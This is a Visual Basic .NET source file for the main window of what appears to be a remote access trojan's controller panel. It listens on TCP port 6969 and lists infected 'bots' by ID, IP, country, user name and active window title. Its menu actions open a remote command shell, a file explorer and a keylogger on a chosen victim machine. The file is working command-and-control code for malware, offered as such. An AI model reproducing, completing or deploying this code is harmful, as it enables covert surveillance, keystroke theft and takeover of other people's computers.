Imports System.Net
Imports System.Net.Sockets

Public Class frmmain
    Public serverTCP As TcpListener
    Public clientMgr As clsClientMgr

    Public Sub Log(ByVal txt As String)
        txtlog.Text = txtlog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
    End Sub

    Private Function Client_Listview_Init()
        With lvClient
            .View = View.Details
            .GridLines = True
            .FullRowSelect = True
            .Sorting = SortOrder.Ascending
            .MultiSelect = False
            .HideSelection = False

            'Add column header
            .Columns.Add("Flag", 35)
            .Columns.Add("Bot ID", 100)
            .Columns.Add("IP Address", 100)
            .Columns.Add("System", 150)
            .Columns.Add("User/Computer Name", 150)
            .Columns.Add("Current Window Title", 300)
        End With
        Return True
    End Function

    Private Function Setting_Init() As Boolean
        If mSettings.ReadSettings() = False Then
            'If read setting fail, then default setting
            With mSettings.ServerSetting
                .Port = 6969
                .isListening = False
            End With
        End If
        Return True
    End Function

    Private Function Timer_Init() As Boolean
        tmThread.Enabled = True
        tmThread.Interval = 500
        Return True
    End Function

    Public Sub AcceptClientCallBack(ByVal ar As IAsyncResult)
        Dim listener As TcpListener = ar.AsyncState

        Try
            If listener.Server IsNot Nothing Then
                If listener.Server.IsBound = True Then
                    Dim clientTCP As TcpClient = listener.EndAcceptTcpClient(ar)
                    Dim clientObj As clsClientObj = New clsClientObj(clientTCP)

                    Log("There is a new connection")
                    clientMgr.RegisterClient(clientObj)
                    Threading.Thread.Sleep(1)
                    serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
                End If
            End If
        Catch ex As Exception
            Log("There is an error while accept connection: " & ex.Message)
            Return
        End Try
    End Sub

    Private Function TCP_Init()
        serverTCP = New TcpListener(IPAddress.Parse("0.0.0.0"), mSettings.ServerSetting.Port)
        If mSettings.ServerSetting.isListening = True Then
            serverTCP.Start()
            serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
        End If
        Return True
    End Function

    Private Function ClientMgr_Init()
        clientMgr = New clsClientMgr()
        Return True
    End Function

    Private Function Global_Init() As Boolean
        Setting_Init()
        Client_Listview_Init()
        Timer_Init()
        TCP_Init()
        ClientMgr_Init()
        Log("Program has been started!")
        Return True
    End Function

    Private Function AddClientToListview(ByVal Client As clsClientObj)
        Dim clientInfo As structClientInfo = Client.GetClientInfo()

        'Add data to listview
        Dim data(5) As String
        data(0) = clientInfo.countryCode
        data(1) = clientInfo.botID
        data(2) = clientInfo.IP
        data(3) = clientInfo.windowVersion
        data(4) = clientInfo.computerUserName
        data(5) = clientInfo.WindowTitle
        Dim itm As ListViewItem = New ListViewItem(data)
        lvClient.Items.Add(itm)
        Return True
    End Function

    Private Function UpdateClientToListview(ByVal Client As clsClientObj, ByVal index As Integer)
        Dim clientInfo As structClientInfo = Client.GetClientInfo()

        'Edit data from listview

        lvClient.Items.Item(index).SubItems.Item(0).Text = clientInfo.countryCode
        lvClient.Items.Item(index).SubItems.Item(1).Text = clientInfo.botID
        lvClient.Items.Item(index).SubItems.Item(2).Text = clientInfo.IP
        lvClient.Items.Item(index).SubItems.Item(3).Text = clientInfo.windowVersion
        lvClient.Items.Item(index).SubItems.Item(4).Text = clientInfo.computerUserName
        lvClient.Items.Item(index).SubItems.Item(5).Text = clientInfo.WindowTitle

        Return True
    End Function

    Private Function ClientRefresh() As Boolean
        clientMgr.RefreshClient()
        Return Nothing
    End Function

    Private Sub frmmain_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Global_Init()
    End Sub

    Private Sub CrystalClearButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdExit.Click
        mSettings.WriteSettings()
        End
    End Sub

    Private Sub tmThread_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmThread.Tick
        'Update status
        If mSettings.ServerSetting.isListening Then
            lbStatus.Text = "Listening on port " + mSettings.ServerSetting.Port.ToString
        Else
            lbStatus.Text = "No port listening"
        End If

        'Save select item
        Try
            If lvClient.SelectedItems.Count > 0 Then
                SelectedItemComName = lvClient.FocusedItem.SubItems(4).Text
            Else
                SelectedItemComName = ""
            End If
        Catch
            SelectedItemComName = ""
        End Try

        'Update List of Client
        Dim ClientList As List(Of clsClientObj) = clientMgr.GetClientList()
        clientMgr.RefreshClient()
        If ClientList.Count <> lvClient.Items.Count Then
            lvClient.Items.Clear()
            For Each ClientObj As clsClientObj In ClientList
                AddClientToListview(ClientObj)
            Next
        Else
            Dim i As Integer = 0
            For Each ClientObj As clsClientObj In ClientList
                UpdateClientToListview(ClientObj, i)
                i += 1
            Next
        End If


    End Sub

    Private Sub cmdListen_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdListen.Click
        frmListen.ShowDialog()
    End Sub

    Dim SelectedItemComName As String

    Private Sub lvClient_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lvClient.MouseClick
        If e.Button = Windows.Forms.MouseButtons.Right Then
            If lvClient.FocusedItem.Bounds.Contains(e.Location) Then
                ctxMenu.Show(lvClient, e.Location)
            End If
        End If
    End Sub

    Private Sub lvClient_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lvClient.SelectedIndexChanged
        'Try
        'If lvClient.SelectedItems.Count > 0 Then
        'SelectedItemComName = lvClient.FocusedItem.SubItems(4).Text
        'Else
        'SelectedItemComName = ""
        'End If
        'Catch
        'SelectedItemComName = ""
        'End Try
    End Sub

    Private Function GetSelectedClient() As clsClientObj
        Dim ClientList As List(Of clsClientObj) = clientMgr.GetClientList()
        For Each ClientObj As clsClientObj In ClientList
            If ClientObj.GetClientInfo.computerUserName = SelectedItemComName Then
                Return ClientObj
            End If
        Next
        Return Nothing
    End Function

    Private Sub RemoteCMDToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteCMDToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmcmd.CmdObj = selectedClient.GetFeaObjByID(1)
        frmcmd.ShowDialog()
    End Sub

    Private Sub FileExplorerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileExplorerToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmFileExplorer.fileExplorerObj = selectedClient.GetFeaObjByID(3)
        frmFileExplorer.ShowDialog()
    End Sub

    Private Sub KeyloggerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KeyloggerToolStripMenuItem1.Click
        Dim selectedClient As clsClientObj = GetSelectedClient()
        If selectedClient Is Nothing Then
            MsgBox("Can't get selected client", vbCritical, "Error")
            Return
        End If

        frmKeylogger.KeyloggerObj = selectedClient.GetFeaObjByID(2)
        frmKeylogger.ShowDialog()
    End Sub
End Class
